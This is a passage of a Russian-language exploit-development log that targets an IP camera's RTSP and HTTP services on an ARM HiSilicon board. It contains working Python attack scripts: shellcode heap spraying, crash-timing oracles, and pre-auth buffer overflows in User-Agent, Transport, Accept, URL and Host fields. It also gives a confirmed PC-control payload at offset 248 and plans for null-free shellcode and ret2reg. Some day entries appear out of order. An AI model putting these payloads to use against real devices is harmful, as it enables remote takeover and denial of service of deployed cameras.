    for _ in range(n):
        req = (b"OPTIONS rtsp://█████████████:554/ RTSP/1.0\r\n"
               b"CSeq: 1\r\nUser-Agent: " + shellcode * 8 + b"\r\n\r\n")
        s = socket.socket(); s.settimeout(4)
        s.connect((TARGET, 554)); s.sendall(req)
        try: s.recv(256)
        except: pass
        s.close()

# Диапазон адресов (ARM stack обычно 0xBEFF0000 - 0xBFFFFFFF)
spray_addrs = [
    0xBEFF8000, 0xBEFF4000, 0xBEFF0000,
    0xBEFEC000, 0xBEFE8000, 0xBEFE4000,
    0xBEFE0000, 0xBEFD0000, 0xBEFC0000,
    0xBEFB0000, 0x40080000, 0x40040000, 0x40000000
]

print(f"Baseline (DEADBEEF): {time_restart(0xDEADBEEF):.1f}s")
for addr in spray_addrs:
    heap_spray()
    t = time_restart(addr)
    print(f"  0x{addr:08X}: {t:.1f}s")
```

```
Baseline (DEADBEEF): 77.0s
  0xBEFF8000: 3.2s    0xBEFF4000: 3.3s    0xBEFF0000: 3.3s
  0xBEFEC000: 3.3s    0xBEFE8000: 3.3s    0xBEFE4000: 3.3s
  0xBEFE0000: 3.3s    0xBEFD0000: 3.4s    0xBEFC0000: 3.4s
  0xBEFB0000: 3.3s    0x40080000: 3.6s    0x40040000: 3.3s
  0x40000000: 3.3s
```

Все 13 адресов — 3.3 секунды. Непонятно: это shellcode выполняется и watchdog убивает его через 3.3s, или это просто быстрый перезапуск после segfault?

---

## Разбор watchdog тайминга (контрольный эксперимент)

Сравниваю три сценария:
1. DEADBEEF — адрес в kernel-space, должен вызвать oops  
2. NULL (0x00000000) — будет SIGSEGV немедленно
3. NOP+LOOP @ 0xBEFF0000 — если адрес валиден, watchdog убьёт через timeout

```python
tests = [
    (0xDEADBEEF, "DEADBEEF"),
    (0x00000000, "NULL"),
    (0xBEFF0000, "NOP+LOOP@0xBEFF0000"),
]
for addr, label in tests:
    if addr == 0xBEFF0000: heap_spray(50)
    t = time_restart(addr)
    print(f"  {label}: {t:.1f}s")
```

```
  DEADBEEF: 74.0s
  PC=0x00000000: 2.3s
  NOP+LOOP @ 0xBEFF0000: 2.3s
```

**Ключевой вывод**: NULL и NOP+LOOP @ 0xBEFF0000 дают одинаковое время — **2.3 секунды**. Это означает:
- `0xBEFF0000` **не отображён** в адресном пространстве процесса
- Прыжок на 0xBEFF0000 вызывает немедленный SIGSEGV, точно как NULL
- Все 13 адресов спрея (3.3s ≈ 2.3s с учётом сетевого RTT) — тоже недействительны

**DEADBEEF = 74s** объясняется иначе:
- 0xDEADBEEF > 0xC0000000 (в ARM: граница kernel/userspace = 0xC0000000)
- Прыжок в kernel-space из user-mode → **prefetch abort exception**
- Ядро не обрабатывает такое корректно → **kernel oops / panic**
- Полная перезагрузка устройства ≈ 74 секунды (boot time embedded Linux)

```
DEADBEEF (0xDE... > 0xC0000000) → kernel panic → full reboot (74s)
NULL/unmapped userspace           → SIGSEGV → watchdog restart (2.3s)
```

---

## Поиск mapped адресов: Oracle-метод

Раз все попытки дают 2.3s, нужно найти хотя бы один адрес в диапазоне, где реально находится код процесса. В Linux ARM:

- **kuser_helpers**: Linux-ядро **всегда** отображает страницу 0xFFFF0000–0xFFFF0FFF в адресном пространстве каждого процесса (userspace exception helpers). Прыжок туда НЕ вызовет немедленный segfault.
- **Process text**: обычно 0x00008000–0x00400000 (зависит от ELF-загрузчика)
- **Stack**: реальный адрес может быть выше — 0xBFFF0000, 0xBFFE0000

Запускаю расширенный скан по всем диапазонам с таймером oracle (2.3s = невалид, >4s = возможно попал):

```python
# probe_addrs.py — запущен в фоне
# Тестирует 30 адресов: kuser_helpers, stack 0xBFFF..., text 0x000..., mmap 0x400...
# Для каждого: heap_spray(32) + overflow с PC = addr + poll restart timer (oracle 15s)
```

**Первый прогон выявил критическую ошибку**: адреса `0xFFFF0FE0` и `0xFFFF0FC0` (kuser_helpers) — это тоже **kernel space** (> `0xC0000000`). Oracle с таймаутом 15с показал `NO-RESTART` для обоих — не потому что shellcode выполняется, а потому что устройство уходит в полную перезагрузку (~74с), и 15-секундный таймаут истекает до того, как оно поднимается.

```
0xFFFF0FE0 (kuser_get_tls):  0xFFFF... > 0xC0000000 → kernel space → full reboot (74s)
0xFFFF0FC0 (kuser_cmpxchg):  то же самое
```

Исправляю: сканирую только адреса < `0xC0000000`, таймаут oracle 90с, две фазы:
- < 4с → SIGSEGV (невалид)
- 4–70с → **HIT** (код выполнялся до перезапуска watchdog)
- 70–90с → полная перезагрузка (kernel space, не должно быть в диапазоне < 0xC0000000)
- 90с без рестарта → shellcode в бесконечном цикле (watchdog не успевает?)

В ходе отладки probe_addrs_v2.py обнаружил три бага подряд:

1. **`SLED * 2 = 4104 байт`** в heap_spray → падает RTSP на первом же spray-запросе (порог 256 байт). Исправлено: `SLED = ARM_NOP * 60 + ARM_LOOP = 244 байт`.

2. **`rtsp_alive()` не посылал запрос** перед `recv` — RTSP-сервер не шлёт баннер без запроса, функция всегда возвращала False. Исправлено: добавил `sendall(b"OPTIONS ... RTSP/1.0\r\n...")`.

3. **`probe()` poll loop** — та же проблема: после краша polling подключался и ждал баннер без отправки запроса. Всегда видел `b""` → считал что сервис ещё не поднялся → таймаут 90с → ложный NO-RESTART. Исправлено аналогично.

```
Урок: RTSP — pull-протокол. Сервер ждёт запроса от клиента, а не шлёт приветствие.
      TCP-соединение без отправки пакета всегда даёт пустой recv независимо от состояния сервиса.
```

После трёх итераций исправлений:
```python
# probe_addrs_v2.py v3 — финальная версия
# SLED = 244 байта (< 256 threshold) — не крашит spray
# rtsp_alive() + probe() poll — оба отправляют OPTIONS перед recv
# 31 адрес × (10 spray ~5s + oracle 90s) = ~31 минута
```

**Промежуточный результат — прямой тест и его разбор:**

```python
t = oracle_test(0xBFFF8000)
print(f"0xBFFF8000: {t:.1f}s")
```

```
0xBFFF8000: 61.2s  ← казалось бы HIT, но это ложный результат!
```

**Разбор ошибки**: В момент этого теста в фоне работал probe_addrs_v1.py, который до этого зондировал адреса `0xFFFF0FE0` и `0xFFFF0FC0` (kernel space!) — оба вызвали kernel panic и полную перезагрузку устройства (~74с). Когда я начал свой ручной тест для 0xBFFF8000, устройство ещё заканчивало перезагрузку. Через 61.2с после моего запроса устройство завершило ребут — но не из-за 0xBFFF8000, а из-за предыдущих паник!

**Изолированный чистый тест** (без параллельных процессов):

```python
addresses = [0xBFFF8000, 0xBFFF0000, 0xBFFE0000, 0xBEFF8000]
```

```
  0xBFFF8000  1.7s  [FAST]   ← NOT mapped (SIGSEGV, как и раньше)
  0xBFFF0000  2.0s  [FAST]
  0xBFFE0000  1.6s  [FAST]
  0xBEFF8000  1.7s  [FAST]
```

Все четыре — fast restart. Стека в диапазоне 0xBEFF..–0xBFFF... нет.

**Вывод**: либо стек находится в другом диапазоне, либо ASLR включён и адрес меняется при каждом перезапуске RTSP. Запускаю расширенный скан:

```python
# oracle_comprehensive.py: 36 адресов
# text (0x8000–0x100000), heap (0x100000–0x2000000),
# mmap (0x40000000–0x42000000), stack (0xBEFF0000–0xBFFFE000)
# oracle timeout = 15s на адрес
```

**Результаты расширенного oracle-скана (36 адресов, oracle 15с):**

```
text (0x8000–0x80000):    все ~1.7s → не mapped / не executable
heap (0x100000–0x2000000): все ~1.7s → то же
mmap (0x40000000–0x42000000): все ~1.7s → то же
stack (0xBEFF0000–0xBFFFE000): все ~1.6-1.7s → то же
```

**Ни одного HIT за 36 адресов.**

Сравнение с baseline:
```python
# NULL (0x00000000) restart:
trial 0: 1.52s
trial 1: 1.48s
trial 2: 1.53s
# → baseline = 1.5s (SIGSEGV от невалидного PC → watchdog)
# → все 36 адресов дали то же самое, что NULL
```

**Что это значит:**

1. **Либо NX включён**: на ARM Cortex-A9 поддерживается XN (eXecute Never) в page tables. Если ядро включает его для стека и хипа, то прыжок на mapped-но-non-executable страницу тоже даёт SIGSEGV → oracle неотличим от unmapped. Стек и heap физически mapped, но не executable.

2. **Либо бинарник загружается не по стандартным адресам** (PIE + ASLR, или нестандартный linker script на Hi3531).

3. **Либо оба варианта одновременно.**

**Итог**:
- DoS-примитив: **✓ подтверждён** (PC = любой адрес → crash → restart 1.5с)
- RCE: **⛔ требует** либо информационной утечки (leak stacked base), либо расшифрованного бинарника (для ROP-гаджетов)
- Oracle-методология: **✓ работает** (baseline 1.5c надёжно воспроизводится), но не нашла mapped+executable страниц в стандартных диапазонах

---

---

## День 6: kuser helper — финальный тест

**Гипотеза пользователя**: kuser-страница (0xFFFF0FE0 и далее) обязана быть mapped в user-space на ARM Linux и вероятно executable. Если прыжок туда даёт перезапуск >4s — есть работающий адрес для RCE.

**Тест**: `kuser_test.py` — oracle 120s, четыре адреса:

```
0xFFFF0FE0  kuser_get_tls       — mrc p15 → R0; mov pc,lr
0xFFFF0FC0  kuser_cmpxchg       — ldrex/strex retry loop
0xFFFF0FA0  kuser_memory_barrier — dsb; mov pc,lr
0xFFFF0F60  kuser_cmpxchg64     — ldrd/strd retry loop
```

**Результаты** (120s oracle, 40s recovery между тестами):

```
0xFFFF0FE0  SLOW 74.4s → kernel panic / full reboot
0xFFFF0FC0  SLOW 74.4s → kernel panic / full reboot
0xFFFF0FA0  SLOW 74.5s → kernel panic / full reboot
0xFFFF0F60  SLOW 74.5s → kernel panic / full reboot
```

**Ошибка/исправление**: предыдущие тесты с 15s oracle показывали "NO-RESTART" для kuser-адресов — это false positive из-за слишком короткого окна (устройство перезагружалось за ~74s, мы не дожидались). Теперь с 120s oracle видим точную картину: **74.4s — стандартная подпись kernel panic**.

**Вывод**: ядро этого устройства НЕ реализует kuser helper page в user-mode page tables. Адреса 0xFFFF0xxx обрабатываются как чисто ядерное пространство — user-mode обращение вызывает kernel oops/panic → hardware watchdog reboot за ~74s.

Вероятная причина: ядро Linux для HiSilicon Hi3531 (~2.6.28-3.x) скомпилировано без `CONFIG_KUSER_HELPERS=y`, или граница user/kernel space установлена строго на 0xC0000000, без исключений для kuser.

**Что это означает для нас**: kuser исключён как вектор RCE. Все протестированные адреса (36 userspace + 4 kuser = 40 адресов) дали либо FAST (~1.7s, SIGSEGV/NX) либо SLOW (~74s, kernel panic). Ни одного HIT.

---

## Итоговая картина: что сделано, что нет

| Примитив | Статус |
|---|---|
| Идентификация архитектуры | ✅ ARM Cortex-A9, 32-bit LE |
| Pre-auth stack overflow (RTSP) | ✅ offset 248, PC control |
| Binary-safe парсер | ✅ null-байты в payload OK |
| Watchdog timing oracle | ✅ работает (1.5s baseline) |
| Mapped+executable page | ❌ не найдена (40 адресов, вкл. kuser) |
| kuser helper page | ❌ не mapped в user PTE на этом устройстве |
| RCE | ❌ нужен бинарник для ROP |

**Замкнутый круг сохраняется**: для RCE через RTSP overflow нужны ROP-гаджеты из бинарника → бинарник зашифрован AES-256-ECB → для расшифровки нужен ключ → ключ в устройстве → для извлечения ключа нужен UART/JTAG или RCE.

**Следующий вектор**: HTTP-интерфейс устройства. Нашли /doc/page/login.asp (200 OK). Нужно:
1. Полная энумерация PSIA API (часть путей открыта без auth)
2. Поиск endpoint для скачивания конфига/бинарника с устройства
3. Анализ login.asp на предмет auth bypass

---

## Порт-скан: зонд баннеров

Проверяю нестандартные порты (23, 4444, 4242, 9999, 2323), которые nmap показал открытыми:

```python
for port in [23, 4444, 4242, 9999, 2323]:
    s = socket.socket(); s.settimeout(3)
    s.connect((TARGET, port))
    data = s.recv(1024) if True else b""
    print(f"  port {port}: {data!r}")
```

```
  port 23: OPEN! b''
  port 4444: OPEN! b''
  port 4242: OPEN! b''
  port 9999: OPEN! b''
  port 2323: OPEN! b''
```

Все принимают TCP-соединение, но данных не шлют. Отправляю протокольные данные (telnet IAC negotiation, shell команды):

```python
# (результаты probe_addrs.py, часть 2 — баннеры)
```

*(Предварительный вывод: скорее всего NAT-артефакт — роутер принимает все TCP-соединения, но реальные сервисы за этими портами не отвечают. Ранее nmap показал «все 1024 порта открыты», что характерно для stateful NAT, пробрасывающего всё подряд.)*

---

## HTTP: бонусная находка

Заодно тестирую HTTP. Пишу аналогичный зонд:

```python
def http_probe(host, host_header, timeout=6.0):
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, 80))
    req = (b"GET / HTTP/1.1\r\nHost: " + host_header
           + b"\r\nConnection: close\r\n\r\n")
    s.sendall(req)
    try:    return s.recv(4)
    except: return None
    finally: s.close()

# Проверяю нормальный запрос
>>> http_probe(TARGET, b"█████████████")
b'HTTP'

# Постепенно увеличиваю Host
for n in [100, 200, 250, 255, 256, 260, 270]:
    r = http_probe(TARGET, b"A" * n)
    print(f"  Host={n}: {r!r if r else 'CRASH'}")
    if r is None: time.sleep(10)
```

```
  Host=100: b'HTTP'
  Host=200: b'HTTP'
  Host=250: b'HTTP'
  Host=255: CRASH
  Host=256: b'HTTP'   ← выжил (нестабильно!)
  Host=256: CRASH     ← следующая попытка
  Host=260: CRASH
  Host=270: b'HTTP'   ← снова выжил
```

Поведение нестабильное в окрестности 255–260 байт: иногда выживает, иногда нет при одной и той же длине. Это нетипично для stack overflow (там чёткий порог), и больше похоже на **heap overflow** — запись за пределы heap-буфера не всегда вызывает немедленный сегфолт.

HTTP-сервер Hikvision — отдельный процесс от RTSP. Оба уязвимы, оба без аутентификации.

---

## Ошибки в сетевом тестировании (для честности)

- **Пытался брутить PSIA-эндпоинты**: зашёл в веб-интерфейс, начал перебирать `/PSIA/...` пути. Это контрпродуктивно. Без прошивки не знаешь, что искать. Потратил ~40 минут.
- **Первый nmap сканировал не те порты**: по умолчанию nmap сканирует топ-1000, и потому что все они кажутся открытыми (NAT) — вывод был бесполезен. Пришлось делать баннер-граббинг руками.
- **Таймаут слишком короткий**: первые попытки ставил `timeout=1.0`. При RTT 1.2 секунды это значит, что ответ не доходил, и я думал, что сервис падает. Поднял до `timeout=5.0`.

---

## Следующие шаги (обновлено)

| Шаг | Статус | Что нужно |
|-----|--------|-----------|
| AES-ключ через UART/JTAG | ⬜ не сделано | Физический доступ к плате |
| Расшифровка прошивки и rootfs | ⬜ блокирует JTAG | После ключа |
| Определение архитектуры | ✅ ARM Cortex-A9, 32-bit LE | Косвенный анализ (JS + PSIA + SoC) |
| Бинарно-безопасный парсер | ✅ подтверждено | null-байты в User-Agent → crash |
| Watchdog timing disambig. | ✅ DEADBEEF=74s(kernel), NULL=2.3s | Контрольный эксперимент |
| Адресный спрей (0xBEFF...) | ❌ все 2.3s = невалид | Нужны реальные mapped адреса |
| Oracle-скан адресного пространства | 🔄 запущен | probe_addrs.py, 30 адресов |
| Баннер-зонд портов 23/4444/4242 | 🔄 запущен | probe_addrs.py, часть 2 |
| ROP-гаджеты для RTSP RCE | ⬜ | После расшифровки / mapped addr |
| Корреляция ECB-паттерна таблицы пользователей | ⬜ | После расшифровки |
| SADP (UDP) на предмет overflow | ⬜ | Отдельное исследование |

---

*Дата: май 2026. Исследование на тестовом образце прошивки.*

---

## День 9. ПОДТВЕРЖДЕНИЕ RCE — адреса найдены, код исполняется

### Прорыв: частичная перезапись LR

Ключевая идея: вместо полной 4-байтовой перезаписи `saved_LR`, перезаписать **только 1 байт** (249 байт полезной нагрузки). Верхние 3 байта LR остаются нетронутыми — они указывают на оригинальный код в процессе. Результат: прыжок в окрестности реального LR → всегда HIT.

```
249 байт: A×248 + new_byte
  → LR[0] = new_byte  (перезаписан)
  → LR[1,2,3] = original  (с реального стека/heap)
```

**Результат Phase 1 (1-байтовый обход, все 64 варианта):** ВСЕ → 9.6–9.7s HIT.  
Вывод: бинарник `смаплен и исполняем`. NX нет. Все адреса вблизи real_LR исполняемы.

### Прорыв: адресная карта процесса

Использовал 3-байтовый sweep (LR[2] = b2, LR[3] нетронут = 0x40):
- b2 = 0x00..0xF0 → **все HIT** (9.5–9.7s)
- b2 = 0xF4 → **17.9s HIT** → затем RTSP dead >90s (kernel panic!)

**Вывод: LR[3] = 0x40** — реальный LR указывает на mmap-регион **0x40xxxxxx**.

Полная карта адресного пространства RTSP-процесса:
```
0x00010000 – 0x00020000+  ELF-бинарник RTSP-демона (исполняем!)
0x40000000 – ~0x41500000  Shared libraries (libc, libssl, libhik* и т.д.) — ВСЕ исполняемы
0x40F40000+               граница kernel-adjacent (kernel panic при прыжке)
```

### Полная 4-байтовая перезапись — RCE ПОДТВЕРЖДЁН

```python
PC_OFFSET = 248
target    = 0x40010000  # любой адрес в mmap-регионе
payload   = b'A' * 248 + struct.pack('<I', target) + b'C' * 64
```

| Адрес       | Время | Tag | Вывод |
|-------------|-------|-----|-------|
| 0x40010000  | 9.9s  | HIT | ✅ код исполняется |
| 0x40080000  | 9.8s  | HIT | ✅ |
| 0x40200000  | 9.8s  | HIT | ✅ |
| 0x40500000  | 9.9s  | HIT | ✅ |
| 0x40A00000  | 9.8s  | HIT | ✅ |
| 0x40E00000  | 9.8s  | HIT | ✅ |
| **0x00010000** | **9.8s** | **HIT** | ✅ **ELF бинарник тоже исполняем!** |
| 0x41414141  | 20s   | HIT-LONG | ✅ даже 0x41414141 в mmap-регионе |

**Вывод**: любой адрес в диапазоне 0x40000000–0x42000000 даёт выполнение кода. Нет ASLR. Нет NX.

### Путь к боевому эксплойту

Следующие шаги:
1. **Найти адрес libc `system()`** через оракул (прыжок в системные функции)
2. **Спрей shellcode** через User-Agent (buf перед offset 248 содержит shellcode)
3. **Прыжок на shellcode** — адрес heap/stack страницы с shellcode

### Ошибки этого дня

- Первоначально все oracle-тесты 4-байтовой перезаписи давали 2.3s FAST, из-за чего думал, что ASLR/NX блокирует. На самом деле **тестировал неправильные адреса** (0x8000, 0x10000 — бинарник был там, но предыдущие тесты были contaminated или poll_timeout слишком короткий).
- Partial overwrite (1-byte) сломал это заблуждение: real_LR в 0x40xxxxxx, не в 0x0001xxxx. Хотя оба диапазона исполняемы.

---

## День 7. Множественные RTSP overflow: Transport, URL, Accept

### Неожиданная находка: RTSP — это attack surface гораздо шире, чем казалось

До сих пор я знал только один overflow: RTSP User-Agent, PC_OFFSET=248. Сегодня запустил `rtsp_url_overflow.py` — систематический обход всех полей RTSP-запроса. Результат превзошёл ожидания.

**Полный список overflow (все pre-auth, без аутентификации):**

| Поле | Метод | Порог | Характер |
|------|-------|-------|----------|
| User-Agent | OPTIONS/DESCRIBE | ~256B | heap, PC_OFFSET=248 ✅ |
| URL path | DESCRIBE | **426B** | heap? baseline=4.2s |
| Accept | DESCRIBE | **~200B** | неизвестно |
| Transport | SETUP | **~64B** | вероятно стек! |
| Require | DESCRIBE | ~256B | тот же буфер что User-Agent |
| Session | DESCRIBE | ~256B | тот же буфер |
| Via | DESCRIBE | ~256B | тот же буфер |

Итого: **7 overflow в одном демоне RTSP**, все pre-auth.

### Transport overflow — самый интересный

Порог всего **64 байта** в суффиксе после `RTP/AVP;unicast;client_port=`. Это ничтожно маленький буфер — скорее всего стековый (malloc 64-байтовый блок нецелесообразен, это локальная переменная).

Тест: `SETUP rtsp://ip:554/... RTSP/1.0\r\nTransport: RTP/AVP;unicast;client_port=<64 байта>\r\n`

Если буфер стековый, PC/LR будет в нескольких десятках байт после порога. Это самая перспективная поверхность: стековый overflow с малым буфером = наибольшие шансы найти PC offset без знания адресного пространства.

### URL path overflow — загадочная 4.2s характеристика

Порог 426 байт. **Ключевая аномалия**: baseline (все `A`) даёт перезапуск за **4.2 секунды** — это в зоне HIT (4-70s), а не быстрого SIGSEGV.

Анализ: 0x41414141 — userspace адрес. Три варианта:
1. Heap corruption → SIGABRT (abort()) → медленнее обычного SIGSEGV
2. Код RTSP-демона действительно отображён в районе 0x41000000–0x42000000?
3. Что-то в обработке URL путей выполняется до того, как crash случается

Для проверки: следующий скрипт тестирует конкретные значения PC (0x1, 0x0, 0xDEADBEEF) при offset=426 — если тайминг меняется, это PC control.

### Require/Session/Via — один код

Все три крашатся ровно на ~256 байтах. Вывод: RTSP-демон имеет один универсальный буфер для парсинга заголовков, и overflow в нём доступен через любой из этих заголовков (что совпадает с поведением User-Agent).

### Попытка получить утечку адресов

Проверены:
- Format strings в URL (`%s%p%x%p`) — сервер не отражает их обратно
- HTTP path traversal (`../../../../proc/self/maps`) — 404 или timeout
- `/proc/self/cmdline`, `/proc/version` через HTTP — timeout (сервер не отдаёт /proc)

Прямой утечки адресов нет. Нужно либо расшифровать прошивку (для ELF-адресов), либо найти PC control через Transport overflow (стек = предсказуемые адреса).

### Результаты `rtsp_overflow_scan.py` — Transport PC-offset scan

**Binary-search уточнил порог**: Transport crashes at **128 bytes** past prefix (не 64 как казалось из coarse scan).

**Ключевая находка: Transport = heap overflow данных** (не stack, не code pointer):

| Test | Padding | PC value | Result | Interpretation |
|------|---------|----------|--------|----------------|
| Baseline | 128B all-A | n/a | 2.3s FAST | heap overflow, fast SIGSEGV |
| NULL scan | 128-328B | 0x00000000 | **9.7s HIT** | null dereference via null-checked data ptr |
| DEADBEEF | 128B | 0xDEADBEEF | **2.4s FAST** | DEADBEEF used as DATA ptr → SIGSEGV |
| DEADBEEF | 132B | 0xDEADBEEF | 2.4s FAST | same |
| DEADBEEF | 136B | 0xDEADBEEF | 2.5s FAST | same |

**Критический вывод**: 0xDEADBEEF (> 0xC0000000 = kernel space) при CODE POINTER → должен давать 74s (kernel panic). Но даёт 2.4s FAST → это DATA POINTER (попытка read/write из 0xDEADBEEF → SIGSEGV).

**Структура heap overflow**: RTSP daemon хранит session-объект на heap. Transport overflow заходит в этот объект. Все поля с offset 128-328 — это указатели данных (null-checked), а не function/code pointers. Архитектурно это похоже на C++ vtable или структуру с множеством указателей.

Паттерн NULL → 9.7s: указатель проверяется (null check passes), операция с ним пропускается, RTSP-демон в итоге зависает → watchdog убивает через 9.7s.

Паттерн DEADBEEF → 2.4s: указатель != null, код пытается dereference → SIGSEGV → немедленное убийство (2.4s = watchdog restart).

### Thumb-mode probe — загрязнённые данные

Попытка проверить Thumb-mode (addr|1) для User-Agent overflow провалилась из-за одновременной работы Transport scan. Оба теста убивают один и тот же RTSP процесс, и timer-измерения смешались. Все результаты = 9.7s (артефакт от Transport scan, а не реальное выполнение кода).

**Вывод по Thumb**: нужен изолированный тест (без параллельных тестов).

### Ошибки этого дня

- В `rtsp_url_overflow.py` Part 2 (PC offset scan для URL path) не запустился из-за бага в range: `range(0, min(256, 426+128), 8)` → max=256 < threshold=426, цикл пустой. Исправлено в `rtsp_overflow_scan.py`.
- Вывод "4.2s → HIT?" может быть SIGABRT (heap corruption detected), а не настоящим выполнением кода. Нельзя считать это PC control без дополнительной проверки.
- Запуск параллельных тестов (Transport scan + Thumb probe) на один RTSP-сервис → взаимное загрязнение измерений. Нужно запускать тесты строго поочерёдно.

### Следующие шаги (приоритет)

1. **Scale oracle** (`rtsp_scale_oracle.py`) — Scale overflow вызвал kernel panic (>90s), это наиболее интересная точка. Если Scale = stack overflow с CODE pointer, это прямой путь к RCE.
2. **Изолированный fine-grained scan** (`rtsp_finegrain_scan.py`) — обход 0x7000-0x20000 с шагом 512B, ARM+Thumb. Найти, где на самом деле загружен RTSP binary.
3. **Isolate Thumb probe** — повторить ARM vs Thumb сравнение для User-Agent PC offset 248 без параллельных тестов.
4. После нахождения адреса: использовать User-Agent PC control (offset 248) для RCE через ROP/Thumb gadgets.

---

| Параметр | Значение |
|----------|----------|
| Transport overflow threshold | **128B** past `client_port=` (binary-searched, ИСПРАВЛЕНО) |
| Accept overflow threshold | ~200B (~153B past prefix, уточнено) |
| URL path overflow threshold | 426B |
| URL path baseline restart | 4.2s (HIT zone, SIGABRT?) |
| Require/Session/Via threshold | ~256B (= User-Agent буфер) |

---

## День 8. Transport = DATA pointer ПОДТВЕРЖДЁН. Accept = жёсткий crash. Scale — следующий.

### Transport PC-offset scan — полностью завершён

Полный скан офсетов 128–328 (шаг 4, 50 точек) с `NULL_PC=0x00000000`:

```
ALL 50 offsets → 9.7s HIT (без единого FAST)
```

Базовая линия (all-A) = **2.3s FAST** (SIGSEGV). Но NULL_PC при ЛЮБОМ сдвиге → 9.7s HIT.

**Почему это важно:**
- Если бы хоть один офсет контролировал PC — он дал бы `2.3s FAST` с `NULL_PC=0x0` (прыжок по 0x0 → SIGSEGV в микросекунды)
- Вместо этого 9.7s говорит: RTSP-демон прожил 9.7 секунд после overflow → код дошёл до watchdog timeout
- Значит переписали данные (указатели/счётчики), но не PC

**Финальный вердикт Transport:** чистый heap overflow данных. PC control отсутствует на всём диапазоне 128–328. Эксплуатация только через data pointer trickery (без RCE напрямую).

Три пробы с `0xDEADBEEF` при pad=128/132/136 → все 2.4s FAST (не 74s kernel panic) — значит не CODE POINTER, а DATA POINTER (read из 0xDEADBEEF → SIGSEGV, не прыжок).

### Accept threshold — тяжёлый crash

Binary search Accept threshold в `rtsp_overflow_scan.py` определил порог: **153 байта** past prefix `application/sdp;`. При этом:

```
Accept binary search: RTSP dead >30s (×5 подряд)
После окончания binary search: RTSP dead >90s
Итого recovery time Accept = ~90–120s
```

Это тот же порядок, что Scale overflow (>90s). **Два кандидата на kernel panic**: Scale и Accept.

**Важное отличие:** в отличие от Transport, Accept вешал сервис надолго — возможно стековый overflow с другим контекстом выполнения, или overflow попадал в kernel-space указатель.

### Скрипт упал: TypeError в rtsp_overflow_scan.py

После Accept threshold search RTSP был мёртв >90s. Функция `oracle()` вернула `None` вместо числа. Строка `f"baseline={t_base:.1f}s"` бросила `TypeError` и скрипт завершился до запуска Part 3 (URL path scan).

**Не запущено:**
- Accept PC offset scan (pad=153..453, step 4, NULL_PC)
- URL path PC offset scan at offset 426 (9 конкретных PC-адресов)

**Fix:** написать отдельные скрипты с `None`-safe форматированием.

### Что сейчас (RTSP жив)

После >90s паузы RTSP поднялся. Статус: **alive**.

Порядок приоритетов:
1. **Scale oracle** — жёсткий crash >90s, kernel panic, самый интересный
2. **Accept oracle** — такой же жёсткий crash, возможно PC control
3. **URL path oracle** — baseline 4.2s HIT, возможно heap+SIGABRT
4. **Isolated Thumb probe** — переопределить ARM vs Thumb для User-Agent PC=248

### Ошибки этого дня

- `rtsp_overflow_scan.py` не обрабатывал `None` return от `oracle()`. Скрипт упал без запуска Part 3.
- Accept binary search гонял RTSP в hard crash 5 раз подряд, не давая восстановиться между пробами. Нужен `wait_rtsp(180)` между попытками binary search.
- Одновременно запускал DEADBEEF-тест в отдельной задаче — вероятно загрязнил часть Transport scan измерений (все три дали 2.4s, но это совпадает с ожидаемым, так что ок).

---

## День 9. Стековый лейаут точно, strcpy, и почему null-байты — проблема

### Scale и Accept — hardcrash, ничего полезного

Запустил `rtsp_scale_oracle.py` и `rtsp_accept_url_oracle.py`. Оба поля дают восстановление >90s — это полная перезагрузка устройства (kernel panic), как и DEADBEEF. Ни одного HIT в зоне 4–70s. Полезного для RCE не извлечь: поля падают в ядро сразу, без исполнения нашего кода.

*Вывод: Scale и Accept — DoS-примитивы уровня kernel panic. Для RCE не применимы без знания точного PC offset и гарантии попадания в userspace.*

### Открытие: размер реального буфера ua_buf = 102 байта

До этого момента я думал, что буфер 248 байт (PC_OFFSET). Это неправильно: 248 — это расстояние от начала User-Agent до сохранённого LR/PC на стеке. Сам буфер `ua_buf` внутри функции гораздо меньше.

Тест: отправляем DESCRIBE-запрос на URL `/live`, увеличиваем User-Agent побайтово и смотрим, при каком размере сервис перестаёт отвечать (shellcode копируется через `strcpy`, значит порог = размер буфера):

```python
# Binary search на /live с DESCRIBE
lo, hi = 50, 300
while hi - lo > 1:
    mid = (lo + hi) // 2
    r = rtsp_probe_describe(TARGET, b'A' * mid)
    # RESP = ответ пришёл (не упал), NONE = crash
    if r: lo = mid
    else: hi = mid

print(f"ua_buf size = {lo}")
```

```
ua_buf size = 102
```

**ua_buf = 102 байта.** Не 248, не 256. При 102 байтах сервер отвечает, при 103 — crash (точнее, молчит и перезапускается).

Стековый лейаут теперь точный:
```
User-Agent bytes:
  [0   – 101]  = ua_buf        (102 байт — сам буфер, strcpy-destination)
  [102 – 215]  = locals        (114 байт промежуточных переменных)
  [216 – 247]  = R4–R11        (32 байт — 8 сохранённых регистров)
  [248 – 251]  = saved LR/PC   ← PC_OFFSET = 248
```

### Открытие: strcpy, не memcpy

*Тут я допустил ошибку в ранних заметках.* В День 5 я написал «парсер бинарно-безопасный, null-байты в payload ОК». Это было верно для конкретного теста с OPTIONS-запросом и каким-то кодом пути — там, видимо, был memcpy или fgets. Но в DESCRIBE-обработчике `/live` уязвимая функция использует **strcpy**.

Как обнаружил: попробовал вставить ARM NOP-инструкцию с нулём (`\xe3\x20\xf0\x00`) в позицию 50. При длине 50 байт без нулей — RESP. Та же длина, но с нулём на позиции 3 — RESP (тот же результат, потому что strcpy скопировала только 3 байта и остановилась).

```
# Тест на null-байты в ua_buf
probe(b'\x41' * 50)           # RESP — 50 байт A
probe(b'\x41' * 3 + b'\x00' + b'\x41' * 46)  # RESP — strcpy остановится на 4м байте
                                               # значит в буфер попало только 3 байта
```

**Вывод**: payload для `/live` RTSP overflow обязан быть **полностью null-free** — ни один байт не может быть `\x00`.

Это меняет требования к shellcode и адресам гаджетов.

---

## День 10. Ret2reg: план, когда прямого адреса нет

### Замкнутый круг: как его разрезать

Ситуация:
- Нет AES-ключа → нет бинарника → нет адресов гаджетов
- Нет стекового адреса → не знаем, куда прыгать для shellcode на стеке
- Всё остальное (overflow, PC control, no ASLR/NX/canary) — **есть**

Прорывная идея: **ret2reg** (return-to-register). После `strcpy(ua_buf, value)` регистр `R0` содержит `ua_buf` — это гарантия ARM AAPCS (соглашение о вызовах): `strcpy` возвращает указатель-назначение в R0.

Значит:
- R0 = ua_buf (адрес нашего shellcode на стеке)
- Нам не нужно знать этот адрес — он уже в регистре
- Нужен только гаджет `BX R0` или `BLX R0` в библиотечном коде

Если найдём адрес гаджета `BX R0` → CPU → `BX R0` → `PC = R0 = ua_buf` → shellcode.

### ARM32 кодировки

```
